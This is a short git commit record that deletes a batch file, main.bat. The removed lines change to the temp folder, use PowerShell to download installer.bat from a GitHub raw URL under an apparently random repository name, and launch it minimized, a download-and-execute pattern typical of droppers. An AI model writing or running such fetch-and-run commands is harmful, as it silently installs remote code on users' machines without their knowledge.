30c8ddd05db032323abb38f9cdacf98a8a9ebcef
walks111551 <aidenwalka@gmail.com>
2024-11-21 18:13:28 -0600

    Delete main.bat

--- main.bat
+++
@@ -1,3 +0,0 @@
-cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/installer.bat' -OutFile installer.bat"
-start /min installer.bat
